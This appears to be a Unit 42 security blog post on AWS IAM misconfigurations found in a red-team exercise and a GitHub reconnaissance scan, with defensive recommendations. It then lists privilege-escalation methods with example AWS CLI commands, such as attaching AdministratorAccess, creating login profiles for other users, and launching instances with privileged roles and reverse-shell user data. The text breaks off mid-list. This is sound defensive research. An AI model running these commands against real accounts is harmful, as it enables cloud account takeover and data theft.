# IAM Attack



### **Executive Summary**

In the spring of 2020, the Unit 42 Cloud Threat Intelligence Team was approached by a customer who wanted the group to test the defenses of their Amazon Web Services (AWS) infrastructure. The customer ran thousands of workloads, hundreds of Amazon Simple Storage Service (S3) buckets and maintained cloud native databases with over 500 active development users and nearly 1,000 roles across four AWS accounts. For this Red Team exercise, Unit 42 researchers were provided limited information about the internal architecture and were given limited access to the environment itself. The researchers were able to gain privileged access to two AWS accounts using two different identity and access management (IAM) misconfigurations. The misconfigurations allowed the researchers to gain access to the cloud as anonymous users and then pivot to source code repositories hosted outside the cloud.

The first identified misconfiguration (see “Risky Combination of Policies”) exploited a risky combination of [policies](https://aws.amazon.com/iam/features/manage-permissions/) that allow users with an IAM role to elevate to [AdministratorAccess](https://console.aws.amazon.com/iam/home#policies/arn:aws:iam::aws:policy/AdministratorAccess). When hundreds of users are given this role, this opens up many potential avenues for exploiting this vulnerability to gain AdministratorAccess and compromise the entire cloud. The second identified misconfiguration (see “Overly Permissive IAM Trust Policy”) exploits an overly permissive [IAM trust policy](https://docs.aws.amazon.com/IAM/latest/UserGuide/id\_roles\_terms-and-concepts.html) that allows unauthenticated users to gain access to internal resources anonymously. The researchers successfully moved laterally inside the cloud to eventually obtain private keys for certificates, database credentials and repository source code.

![The conceptual image illustrates the idea of the risks that misconfigured IAM roles can pose for cloud workloads.](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/Cloud-malware.png)

After analyzing the severity of overly permissive IAM trust policies, Unit 42 researchers then conducted [reconnaissance research](https://unit42.paloaltonetworks.com/iam-roles-compromised-workloads/#post-109032-p8p3dxoyy8ju) on GitHub to look for AWS accounts with misconfigured IAM trust policies. The research found misconfigured accounts belonging to billion-dollar organizations – a U.S. pharmaceutical company and a financial company based in Brazil.

All of these misconfigurations could lead to major data breaches that leak thousands of sensitive details on cloud workloads, such as virtual machine (VM) snapshots, database tables and S3 buckets.

Details of the Red Team exercises and GitHub reconnaissance research can be found in the [Unit 42 Cloud Threat Report, 2H 2020](https://www.paloaltonetworks.com/prisma/cloud/unit42-ctr-oct-2020-IAM) (CTR). This blog covers the techniques and processes used to identify the attack paths in the cloud. The blog analyzes the root cause of risky combinations of IAM policies. Protection and remediation strategies specifically for the identified misconfigurations are also included.

Unit 42 researchers note that all misconfigurations found during the exercise were customer misconfigurations, not AWS platform security misconfigurations. AWS has tried its best to detect and alert users when an IAM trust policy is misconfigured. However, while IAM trust policies are secure by default, users can still override the policies and introduce insecure configurations. AWS also offers its free IAM Access Analyzer to help identify unintended access to resources and data that are shared with an external entity.

**AWS IAM**

[AWS IAM](https://aws.amazon.com/iam/) is one of the most complex services in any cloud environment. It governs the interaction between every user, service and resource. While cloud IAM services are securely designed by the cloud service providers (CSPs), like AWS, if misconfigured by the customer or misused, the damage may impact multiple services and resources. For example, the [Capital One data breach](https://securityboulevard.com/2020/06/the-capital-one-data-breach-a-year-later-a-look-at-what-went-wrong-and-practical-guidance-to-avoid-a-breach-of-your-own/) in 2019 cost the company [$80 million](https://apnews.com/article/technology-hacking-u-s-news-business-d4e46b99d0613bb9c967b868bd751a46) due to overly permissive IAM configurations that allowed the attacker to move laterally from AWS Web Application Firewall (WAF) to Amazon Elastic Compute Cloud (EC2) and S3 buckets.

Knowing how critical IAM services and their configurations can be, when Unit 42 researchers considered how to approach the customer’s requested Red Team exercise, we decided to start with IAM. We tested the customer's cloud environments by poking at different IAM features. Two independent IAM Role-related misconfigurations were identified in two different AWS accounts that allowed researchers to successfully compromise their cloud environments. The next section provides a primer to AWS IAM Roles.

### **AWS IAM Role**

An [AWS IAM Role](https://docs.aws.amazon.com/IAM/latest/UserGuide/id\_roles.html) is an IAM identity that provides temporary access to cloud users or services. The concept of the IAM Role is based on [Role-Based Access Control](https://csrc.nist.gov/CSRC/media/Projects/Role-Based-Access-Control/documents/sandhu96.pdf). Users who need the same access permissions are assigned the same role, and multiple roles may be assigned to a single user. In AWS, a principal (meaning a user or service) assigned a role can obtain a short-term access token by “assuming” the role. The token gives the principal access to authorized resources. Each token can be set to expire between 15 minutes and 12 hours from the time it is granted. Once a token has expired, a new token needs to be requested to continue the access. Common use cases for IAM roles include:

* Users who need temporary access to certain cloud resources can be associated with an IAM Role that grants specific permissions.
* Cloud services like EC2 or AWS Lambda that need to interact with certain cloud resources can be attached with IAM roles.
* Organizations that have existing Identity Providers (IdP) such as [Azure Active Directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview) (AD) or [OpenID](https://openid.net/connect/) can use IAM roles to grant cloud access to users managed by the IdP. Existing users in an AD can simply assume a role to access the cloud without having user accounts in the cloud.
* Users or services from one cloud account can be given cross-account access to another. For example, suppose a group of developers in Cloud A need to collaborate with developers in Cloud B using [AWS CodeBuild](https://aws.amazon.com/codebuild/). In that case, an IAM role can be created in Cloud B to grant access to developers in Cloud A.

**Risky Combination of Policies**

Unit 42 researchers were provisioned with the developer's role in the customer's development environment to emulate insider attacks and/or attacks caused by a credential leak. The environment hosted multiple replicas of the production infrastructure for quality assurance (QA) purposes and was actively used by hundreds of developers.

Unit 42 researchers discovered that users with the developer role could obtain [AdministratorAccess](https://console.aws.amazon.com/iam/home#policies/arn:aws:iam::aws:policy/AdministratorAccess) by chaining a set of permissions. AdministratorAccess in AWS is the "key to the kingdom" that allows attackers to launch any attack against an organization, such as stealing sensitive data or wiping out the entire infrastructure. Although this development environment had no production workloads, an adversary could use the information observed in the development environment to pivot to the production environment. Researchers found credentials, code repositories and even misconfigurations shared in both environments. There were also IAM roles in the production account that allowed users in the development account to assume the role, meaning that attackers in the development account could obtain access tokens in the production account though the [AssumeRole](https://docs.aws.amazon.com/STS/latest/APIReference/API\_AssumeRole.html). AssumeRole is a unique AWS role that allows [cross-account access](https://docs.aws.amazon.com/IAM/latest/UserGuide/id\_roles\_common-scenarios\_aws-accounts.html).

One IAM permission that led to this vulnerability was [IAM:PassRole](https://docs.aws.amazon.com/IAM/latest/UserGuide/id\_roles\_use\_passrole.html). PassRole is a feature that allows a [principal](https://docs.aws.amazon.com/IAM/latest/UserGuide/intro-structure.html#intro-structure-principal) to attach an IAM role to another service. For example, a user with PassRole permission can create an EC2 instance and attach a role to a VM. This VM then can use the permissions associated with the role to access AWS resources. IAM PassRole permission is necessary when a principal needs to use an AWS service to manage other AWS resources. AWS Services such as [EC2](https://aws.amazon.com/ec2/), [Lambda](https://aws.amazon.com/lambda/), [Glue](https://aws.amazon.com/glue/?whats-new-cards.sort-by=item.additionalFields.postDateTime\&whats-new-cards.sort-order=desc) and [ECS](https://aws.amazon.com/ecs/) can all be attached with IAM roles to perform specific actions.

Because the PassRole feature allows a principal to grant permissions to cloud services, it can be abused if its permission policy is not restricted. **A malicious principal can pass permissions that it doesn't have to a service and exploit this service to perform malicious activities on its behalf.**

The IAM roles that a principal can pass depend on **the principal's permissions policy** and **the IAM role's trust policy**. Permissions policy restricts the IAM roles that the principal can pass and the services that the roles can be passed to. Trust policy restricts the services the role can be attached to.

In Figure 1 below, on the left is a permissions policy that allows a principal to pass roles with specific names (role/DevOpsEC2-\* and role/DevOpsECS-\*) to a list of services (ec2.amazonaws.com and ecs.amazonaws.com). On the right is an IAM role's trust policy. In this case, it allows only an EC2 service to assume the role. A principal can pass a role to a target service only when all the following conditions are met:

1. The principal’s permissions policy has IAM:PassRole permission.
2. The role’s name matches the pattern defined in the permissions policy’s resource field.
3. The target service is listed in the permissions policy’s condition field. If there is no condition field, the principal can pass a role to any service.
4. The role's trust policy allows the target service to assume the role.

![The code shown in the image displays an example of a principal's permissions policy and the trust policy of an IAM Role (in this case, DevOpsEC2-EU-NAT)](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-9.png)

Figure 1. The conditions for a principal to pass a role to a service.

If the role is more privileged (has more allowed permissions) than the principal, the principal can access the service that the role is attached to, then there is a potential **privilege escalation**.

Figure 2 illustrates how Unit 42 researchers discovered, exploited and eventually gained AdministratorAccess in the customer's AWS cloud environment. Researchers identified and confirmed the step-by-step actions an attacker could take to compromise the environment.

![The figure displays how an attacker can use permission chaining to escalate privilege. The steps are: 1) Check my permission policies to see my allowed permissions; 2) Check PassRole condition, find list of IAM roles allowed to be passed; 3) Check role trust policies and services I can access, look for roles assumable by some services that I can access; 4) Check role permission policies; 5) Attach a more privileged role to my service](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-10.png)

Figure 2. Attacker’s use of permission chaining to escalate privilege.

1\. An attacker steals a credential from an employee through phishing (e.g. developer role session token). The attacker finds out the permissions of the token by using the [AWS IAM API](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html) or enumerating the services.

2\. The attacker discovers that the token has IAM:PassRole permission and there is no restriction on the roles that can be passed. The attacker can pass ANY role.

!\[The code shown reads: "iam:GetPolicy", "Iam:GetPolicyVersion", "iam:ListRoles", "iam:PassRole", "kms:List\*", "s3:_", "sdb:_"], "Effect": "Allow", "Resource": "\*" ], -- this shows an unrestricted PassRole permission]\(https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-11.png)

Figure 3. An unrestricted PassRole permission.

3\. The attacker checks the existing roles and their trust policies. Normally, each role can only be assumed by a service. The attacker needs to find roles assumable by services to access. The attacker can move forward after finding a subset of roles that meet the conditions.

![This shows a list of existing IAM roles and their trust policies. Each IAM role is partially obscured and followed by a list of trusted entities, in the form of specific AWS services.](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-12.png)

Figure 4. Existing roles and their trust policies.

4\. The attacker checks the permissions policies of the roles that can be exploited. If any of these roles are more privileged (i.e. have more permissions) than the attacker’s current identity, the attacker can pass this role to a service and gain the elevated privilege from the service. The attacker finds multiple roles with AdministratorAccess that can be assumed by EC2.

![This screenshot shows an example of what an attacker in search of IAM Roles with AdministratorAccess could check. Under the tab "policy usage" is a list labeled "permissions," filtered by roles.](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-13.png)

Figure 5. Existing roles with AdministratorAccess

5\. The attacker creates a new EC2 instance and attaches EC2ManagerRole to the VM. The attacker then logs in to the VM and calls the [metadata service API](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) at http://169.254.169\[.]254/latest/meta-data to retrieve the session token. This session token gives the attacker AdministratorAccess to the entire cloud.

![The code shown in the screenshot illustrates how an attacker could create a new EC2 instance and attach an IAM Role with elevated privileges, EC2ManagerRole, to the VM. The attacker then logs in to the VM and calls the metadata service API to retrieve the session token. The session token gives the attacker AdministratorAccess to the entire cloud.](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-14.png)

Figure 6. Obtain the session token with AdministratorAccess in an EC2 instance.

The steps above illustrate just one possible attack path using a misconfigured IAM:PassRole\_.\_ Unit 42 researchers identified multiple IAM roles and services in the customer's environment that could be exploited the same way.

This "class" of attack path was exploitable because the permissions policy of the developer's role had no restriction on the PassRole action (Figure 3). Furthermore, AdministratorAccess was given to multiple IAM roles that could be exploited. Considering that hundreds of developers are using this IdP role daily, there is a considerable chance that, had one of the developers’ laptops been hacked, the outcome would have been damaging. With AdministratorAccess, a malicious actor could exfiltrate sensitive data, disrupt the business operation or lock down the entire infrastructure with ransomware.

Upon identifying the issues, Unit 42 researchers immediately worked with the customer to remediate the misconfiguration and review the logs. Fortunately, the forensic work indicated that no malicious actors had successfully exploited this misconfiguration.

**Overly Permissive IAM Trust Policy**

Unit 42 researchers found the customer’s production AWS account ID from the customer’s GitHub page. The GitHub page hosts instructions and scripts used for integrating with the customer’s products. With the account ID, researchers were able to enumerate the misconfigured IAM Roles by attempting to [assume](https://docs.aws.amazon.com/STS/latest/APIReference/API\_AssumeRole.html) a list of role names. It did not take long to find a misconfigured role that can be assumed anonymously. Figure 7 illustrates how researchers identified and confirmed the step-by-step actions an attacker could take to compromise the environment:

![The figure shows an attacker's path to compromise the cloud: 1) Enumerate names in search of misconfigured IAM roles; 2) Enumerate session token permissions in search of EC2, S3, KMSAccess; 3) Enumerate EC2 userdata and get a list of S3 buckets, leading to accessing S3; 4) Get encrypted objects from S3, allowing for KMS decryption; 5) Decrypt objects using KMS, obtaining service credentials; 6) Access more services.](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-15.png)

Figure 7. Attacker’s path to compromise the cloud.

1. An attacker obtains a list of role names (e.g., prodApp-nat, prodApp-app2-nat) through reconnaissance and enumeration. Because the role names are not long and somewhat predictable, it is feasible to find a misconfigured role through enumeration.

![The code in the image shows an example of an IAM roles trust policy that allows anonymous access: "Effect": "Allow", "Principal": { "AWS": "\*"}, "Action": "sts:AssumeRole"](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-16.png)

Figure 8. IAM roles trust policy that allows anonymous access.

2\.  The attacker obtains a temporary access token by assuming the misconfigured role. With the access token, the attacker can enumerate the permissions and find the resources it can access.

![This breaks down the specific lines of code in a misconfigured IAM role that enumerate permissions for EC2, S3 and KMS services and show what resources an attacker can access after gaining access to the role.](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-17.png)

Figure 9. The misconfigured IAM role has limited access to EC2, S3 and KMS services.

3\. The attacker can see all the EC2 instances and read their metadata. From the startup script in the metadata, the attacker can obtain information such as the Docker images the VM deploys, the database that the VM queries and the S3 buckets the VM pulls data from.

![Once gaining access through misconfigured IAM roles, the attacker can see all the EC2 instances and read their metadata. This allows the attacker to obtain information sucha s the Docker images the VM deploys, the database that the VM queries and the S3 buckets the VM pulls data from.](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-18.png)

Figure 10. A sample of EC2 metadata shows the S3 buckets that the VM can access.

4\. The attacker then accesses the S3 buckets found in the EC2 metadata and downloads all the data. There are certificate keys, multiple shell scripts used for deploying applications and a few encrypted files containing credentials.

![The attacker then accesses the S3 buckets found in the EC metadata and downloads all the data. The screenshots shown illustrate the types of sensitive files found in the compromised S3 bucket, including certificate keys, multiple shell scripts used for deploying applications and a few encrypted files containing credentials.](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-19.png)

Figure 11. Sensitive files in the compromised S3 bucket.

5\. The attacker uses the [AWS KMS decrypt](https://docs.aws.amazon.com/kms/latest/APIReference/API\_Decrypt.html) capability available to the role to decrypt the ciphertext, now giving the attacker plaintext access credentials.

6\. After obtaining the plaintext credentials, the attacker can move laterally and access the Docker Hub repository, Splunk server and databases.

![The screenshot shows the compromised source code repository in Docker Hub, which is one of the assets the attacker can move laterally and access after obtaining the plaintext credentials.](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-20.png)

Figure 12. Compromised source code repository in Docker Hub.

This misconfigured IAM role was a critical vulnerability because it allowed an unauthenticated attacker to exploit it remotely. With the private keys for certificates, attackers could launch man-in-the-middle attacks or impersonate the company’s official sites. With source code repository access, attackers could leak the company’s intellectual properties, find vulnerabilities or even inject malware into the source code. Fortunately, the forensic work indicated that no malicious actors had successfully exploited this misconfiguration.

**A Peek at Misconfigured IAM Trust Policies in the Wild**

Since it is possible to check the IAM trust policy's configuration remotely and anonymously, Unit 42 researchers were curious to discover how common the misconfiguration is. The researchers' approach was to use publicly available data in GitHub to conduct reconnaissance operations.

Searching for misconfigured IAM roles is similar to searching for exposed databases that allow logging in without a password. Instead of scanning for IP addresses and ports, Unit 42 researchers performed a scan for AWS account IDs. Instead of searching for database users who can be authenticated without a password, researchers searched for IAM roles that can be assumed anonymously. If the name of a misconfigured role is correctly guessed, researchers (or attackers) could assume the role and obtain an access token.

Overall, Unit 42 researchers analyzed 283,751 files across 145,623 repositories and identified 32,987 confirmed AWS account IDs and 68,361 role names. Figure 13 illustrates the research methodology:

![The figure shows the steps taken to find misconfigured IAM roles on GitHub: 1) GitHub search, 2) File Analysis, 3) validation, 4) Role name enumeration, 5) Check misconfigured IAM roles](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-21.png)

Figure 13. Methodology of finding misconfigured IAM roles on GitHub.

1. Unit 42 researchers used [GitHub API](https://docs.github.com/en/rest) to search for files that may contain [Amazon Resource Names](https://docs.aws.amazon.com/general/latest/gr/aws-arns-and-namespaces.html) (ARNs) or [AWS IAM Role Names](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-iam-role.html). Researchers used all possible resource names listed in the [IAM document](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference\_policies\_actions-resources-contextkeys.html) as keywords to query the GitHub API. For example, the keyword arn:aws:amplify matches an [AWS Amplify](https://aws.amazon.com/amplify/) ARN and the keyword arn:aws:cloud9 matches a [AWS Cloud9](https://aws.amazon.com/cloud9/) ARN. IAM Role Name may also appear in an IAM ARN such as arn:aws:iam:123456789012:role/MyTestRole. Because AWS operates in 3 different [partitions](https://docs.amazonaws.cn/en\_us/general/latest/gr/aws-arns-and-namespaces.html), different partition names (aws, aws-cn, aws-us-gov) were also used in the search keywords.
2. Once all the files had been downloaded, Unit 42 researchers first extracted potential account IDs and role names using regular expressions. If a file was in [AWS CloudFormation](https://aws.amazon.com/cloudformation/) or [Terraform](https://www.terraform.io/) format, the file was further parsed into a JSON object and had all the property names analyzed. Due to the popularity of IaC templates, more than 70% of the downloaded files were IaC, which made the analysis easier and more accurate.
3. Because not all the extracted account IDs are valid, researchers used the [AWS Management Console](https://docs.aws.amazon.com/IAM/latest/UserGuide/console.html) page to validate each account ID. AWS creates a console page at https://**account\_alias\_or\_id**.signin.aws.amazon.com/console/ for each active account. If an account ID exists and is active, sending an http request to this URL will receive an HTTP 200 response. AWS accounts in aws-cn and aws-us-gov partitions can also be tested similarly using URLs https://**account\_alias\_or\_id**.signin.amazonaws.cn/console/ and https://**account\_alias\_or\_id**.signin.amazonaws-us-gov.com/console/, respectively.

![This is the 404 page that shows when an attacker attempts to access the console page of a non-existent AWS account ID.](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-22.png)

Figure 14. Attempt to access the console page of a non-existent AWS account ID.

4\. Finding existing role names in an AWS account is similar to brute-forcing passwordless user names in a database. Thanks to the technique published by [Rhino Security Labs](https://rhinosecuritylabs.com/aws/aws-role-enumeration-iam-p2/), it is possible to check if a role name exists in an AWS account without leaving any trace in the target account. The technique abuses the AWS IAM trust policy validator to check if an IAM role specified in the Principal field exists. Unit 42 researchers enumerated each verified account ID with a subset of role names identified in Step 2. Role names found in the same GitHub repository as the account ID were tested first, followed by the top 500 most common IAM role names found in GitHub.

![This shows the code that could be used in an attempt to set the principal to a non-existent IAM role, as well as the resulting error message, "Invalid principal in policy."](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/10/word-image-23.png)

Figure 15. Attempt to set the principal to a non-existent IAM role.

5\. To check if an existing IAM role can be assumed anonymously, Unit 42 researchers attempted to assume each role using the [assume-role](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/assume-role.html) command. If the role can be assumed anonymously, a secret key and session token set will be returned. Note that this step leaves logs at the target account regardless of whether the role is successfully assumed.

Within the misconfigured accounts, hundreds of thousands of EC2 snapshots, thousands of EC2 volumes and hundreds of S3 buckets were found. The resources leaked from a misconfigured IAM role depended on the permission policy of the role itself. Unit 42 researchers discovered misconfigured DevOps roles that had near system administrator permission. Also found were misconfigured DBAccess roles that had access to database services such as Amazon DynamoDB and Amazon Redshift. Finally, there were LambdaExecution roles that allowed only basic Get and Invoke actions on Lambda functions.

Most notably, the research found misconfigured accounts belonging to billion-dollar organizations – a U.S. pharmaceutical company and a financial company based in Brazil.

Regardless of the types of resources these misconfigured roles could access, they all leaked information that malicious actors can exploit. **A compromised cloud account could be much worse than a compromised cloud host because a cloud account may have access to hundreds or thousands of cloud resources.** The seemingly endless resources in the cloud make the infrastructure an attractive target. Even an account with only LambdaExecution permission could impose significant financial impact by invoking a large number of function calls.

### Conclusion

Humans are good at many things, but identifying risky permissions across hundreds of identities is a task best left to automation. Research has shown that overly permissive or stale accounts exist in almost every cloud environment. While cloud providers deliver a good baseline for implementing a least-privileged approach to permissions, this breaks down as cloud adoption scales across multiple providers. The complex and dynamic nature of IAM makes it difficult to stay in a secure state continuously. A secure IAM today may become insecure tomorrow when a new role is added or an existing policy is edited. Nevertheless, good IAM hygiene can also greatly reduce risk.

Unit 42 researchers recommend the following best practices:

**AWS users**

* **Granular access control on sensitive data and workloads (least privilege)**: Grant only absolutely needed permissions to users and services. A few examples:
  * If a service only needs to access a few files in an S3 bucket, don’t grant the service access to the entire bucket.
  * If a service only needs to decrypt/encrypt data using a particular key in the KMS, don’t grant the service access to the entire KMS.
  * If a sensitive file in an S3 bucket or a key in KMS is only accessed by a particular service, [block all traffic from sources](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference\_policies\_examples\_aws\_deny-ip.html) other than the service.
* **Harden IAM Role’s Trust Policy**: Never grant [anonymous access](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference\_policies\_elements\_principal.html) ("Principal" : { "AWS" : "\*" }) to any IAM role. Make role names difficult to guess by adding random strings. If the role is shared across AWS accounts, enforce unguessable [external ID](https://aws.amazon.com/blogs/security/how-to-use-external-id-when-granting-access-to-your-aws-resources/) as another layer of protection. If a role is only assumed by users or services from specific IP addresses, enforce a [condition on the principal’s source IPs](https://aws.amazon.com/premiumsupport/knowledge-center/iam-restrict-calls-ip-addresses/).
* **Harden the IAM:PassRole Permission:** When granting the IAM:PassRole permission in a policy, always enforce restrictions on:
  * [The role names that the principal can pass](https://docs.aws.amazon.com/IAM/latest/UserGuide/id\_roles\_use\_passrole.html).
  * [The services that the principal can pass a role to](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference\_policies\_examples\_iam-passrole-service.html).

**All CSP users**

* **Enable MFA**: Multi-factor authentication (MFA) provides another layer of security in case the primary password is compromised. MFA can be enabled for both users and IAM roles.
* **Automate Credential Rotation**: Implement an automated process to rotate credentials used in the cloud environment. Rotating credentials periodically can mitigate the risk of credential leak.
* **Harden the IAM:PassRole Permission:** When granting the IAM:PassRole permission in a policy, always enforce restrictions on:
  * [The role names that the principal can pass](https://docs.aws.amazon.com/IAM/latest/UserGuide/id\_roles\_use\_passrole.html).
  * [The services that the principal can pass a role to](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference\_policies\_examples\_iam-passrole-service.html).
* **Create groups or roles with granular permissions:** Users in the same project tend to have similar permission requirements and can be placed in the same group or role to simplify the permission management. However, if there are smaller teams working on different parts of the project, roles or groups with smaller permission boundaries should be created for each team.
* **Monitor IAM APIs**: All major cloud service providers have services to monitor IAM usage. These services help identify abnormal activities, such as brute-force attacks and logging from unrecognized devices or locations.
* **Leverage cloud native security platforms**: Managing a large number of privileged users with access to an ever-expanding set of sensitive resources can be challenging. On top of that, cloud resources themselves have permission sets that need to be managed. Cloud native security platforms (CNSPs) like Prisma Cloud help leverage the identity of cloud resources to enforce security policies and ensure secure user behavior across multiple cloud environments.

### Specific AWS Escalation Methods

Here we get into the full list of identified escalation methods, as well as a description and potential impact for each.

Specific credit to Asaf Hecht and the team at CyberArk for their initial research into “[AWS Shadow Admins”](https://www.cyberark.com/threat-research-blog/cloud-shadow-admin-threat-10-permissions-protect/). Their aggregation of AWS IAM privilege escalation research is included here and helped drive forward this idea and the discovery of new methods.

#### 1. Creating a new policy version

**Description:** An attacker with the iam:CreatePolicyVersion permission can create a new version of an IAM policy that they have access to. This allows them to define their own custom permissions. When creating a new policy version, it needs to be set as the default version to take effect, which you would think would require the iam:SetDefaultPolicyVersion permission, but when creating a new policy version, it is possible to include a flag (–set-as-default) that will automatically create it as the new default version. That flag does **not** require the iam:SetDefaultPolicyVersion permission to use.

An example command to exploit this method might look like this:

> _aws iam create-policy-version –policy-arn target\_policy\_arn –policy-document file://path/to/administrator/policy.json –set-as-default_

Where the policy.json file would include a policy document that allows any action against any resource in the account.

**Potential Impact:** This privilege escalation method could allow a user to gain full administrator access of the AWS account.

#### 2. Setting the default policy version to an existing version

**Description:** An attacker with the iam:SetDefaultPolicyVersion permission may be able to escalate privileges through existing policy versions that are not currently in use. If a policy that they have access to has versions that are not the default, they would be able to change the default version to any other existing version.

An example command to exploit this method might look like this:

> _aws iam set-default-policy-version –policy-arn target\_policy\_arn –version-id v2_

Where “v2” is the policy version with the most privileges available.

**Potential Impact:** The potential impact is associated with the level of permissions that the inactive policy version has. This could range from no privilege escalation at all to gaining full administrator access to the AWS account, depending on what the inactive policy versions have access to.

#### 3. Creating an EC2 instance with an existing instance profile

**Description:** An attacker with the iam:PassRole and ec2:RunInstances permissions can create a new EC2 instance that they will have operating system access to and pass an existing EC2 instance profile/service role to it. They can then login to the instance and request the associated AWS keys from the EC2 instance meta data, which gives them access to all the permissions that the associated instance profile/service role has.

The attacker can gain access to the instance in a few different ways. One way would be to create/import an SSH key and associated it with the instance on creation, so they can SSH into it. Another way would be to supply a script in the EC2 User Data that would give them access, such as an Empire stager, or even just a reverse shell payload.

Once the instance is running and the user has access to it, they can query the EC2 metadata to retrieve temporary credentials for the associated instance profile, giving them access to any AWS service that the attached role has.

An example command to exploit this method might look like this:

> _aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my\_ssh\_key –security-group-ids sg-123456_

Where the attacker has access to my\_ssh\_key and the security group sg-123456 allows SSH access. Another command that could be run that doesn’t require an SSH key or security group allowing SSH access might look like this:

> _aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh_

Where the .sh script file contains a script to open a reverse shell in one way or another.

An important note to make about this attack is that an obvious indicator of compromise is when EC2 instance profile credentials are used outside of the specific instance. Even AWS GuardDuty triggers on this (https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types.html#unauthorized11), so it is not a smart move to exfiltrate these credentials and run them locally, but rather access the AWS API from within that EC2 instance.

**Potential Impact:** This attack would give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account.

#### 4. Creating a new user access key

**Description:** An attacker with the iam:CreateAccessKey permission on other users can create an access key ID and secret access key belonging to another user in the AWS environment, if they don’t already have two sets associated with them (which best practice says they shouldn’t).

An example command to exploit this method might look like this:

> _aws iam create-access-key –user-name target\_user_

Where target\_user has an extended set of permissions compared to the current user.

**Potential Impact:** This method would give an attacker the same level of permissions as any user they were able to create an access key for, which could range from no privilege escalation to full administrator access to the account.

#### 5. Creating a new login profile

**Description:** An attacker with the iam:CreateLoginProfile permission on other users can create a password to use to login to the AWS console on any user that does not already have a login profile setup.

An example command to exploit this method might look like this:

> _aws iam create-login-profile –user-name target\_user –password ‘|\[3rxYGGl3@\`_~~_68)O{,-$1B”zKejZZ.X1;6T}\<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\\hq.#@dh49″=fT;|,lyTKOLG7J\[qH$LV5U<9\`O_~~_Z”,jJ\[iT-D^(‘ –no-password-reset-required_

Where target\_user has an extended set of permissions compared to the current user and the password is the max possible length (128 characters) with all types of characters (symbols, lowercase, uppercase, numbers) so that you can guarantee that it will meet the accounts minimum password requirements.

**Potential Impact:** This method would give an attacker the same level of permissions as any user they were able to create a login profile for, which could range from no privilege escalation to full administrator access to the account.

#### 6. Updating an existing login profile

**Description:** An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup.

Like creating a login profile, an example command to exploit this method might look like this:

> _aws iam update-login-profile –user-name target\_user –password ‘|\[3rxYGGl3@\`_~~_68)O{,-$1B”zKejZZ.X1;6T}\<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\\hq.#@dh49″=fT;|,lyTKOLG7J\[qH$LV5U<9\`O_~~_Z”,jJ\[iT-D^(‘ –no-password-reset-required_

Where target\_user has an extended set of permissions compared to the current user and the password is the max possible length (128 characters) with all types of characters (symbols, lowercase, uppercase, numbers) so that you can guarantee that it will meet the accounts minimum password requirements.

**Potential Impact:** This method would give an attacker the same level of permissions as any user they were able to update the login profile for, which could range from no privilege escalation to full administrator access to the account.

#### 7. Attaching a policy to a user

**Description:** An attacker with the iam:AttachUserPolicy permission can escalate privileges by attaching a policy to a user that they have access to, adding the permissions of that policy to the attacker.

An example command to exploit this method might look like this:

> _aws iam attach-user-policy –user-name my\_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess_

Where the user name is the current user.

**Potential Impact:** An attacker would be able to use this method to attach the AdministratorAccess AWS managed policy to a user, giving them full administrator access to the AWS environment.

#### 8. Attaching a policy to a group

**Description:** An attacker with the iam:AttachGroupPolicy permission can escalate privileges by attaching a policy to a group that they are a part of, adding the permissions of that policy to the attacker.

An example command to exploit this method might look like this:

> _aws iam attach-group-policy –group-name group\_i\_am\_in –policy-arn arn:aws:iam::aws:policy/AdministratorAccess_

Where the group is a group the current user is a part of.

**Potential Impact:** An attacker would be able to use this method to attach the AdministratorAccess AWS managed policy to a group, giving them full administrator access to the AWS environment.

#### 9. Attaching a policy to a role

**Description:** An attacker with the iam:AttachRolePolicy permission can escalate privileges by attaching a policy to a role that they have access to, adding the permissions of that policy to the attacker.

An example command to exploit this method might look like this:

> _aws iam attach-role-policy –role-name role\_i\_can\_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess_

Where the role is a role that the current user can temporarily assume with sts:AssumeRole.

**Potential Impact:** An attacker would be able to use this method to attach the AdministratorAccess AWS managed policy to a role, giving them full administrator access to the AWS environment.

#### 10. Creating/updating an inline policy for a user

**Description:** An attacker with the iam:PutUserPolicy permission can escalate privileges by creating or updating an inline policy for a user that they have access to, adding the permissions of that policy to the attacker.

An example command to exploit this method might look like this:

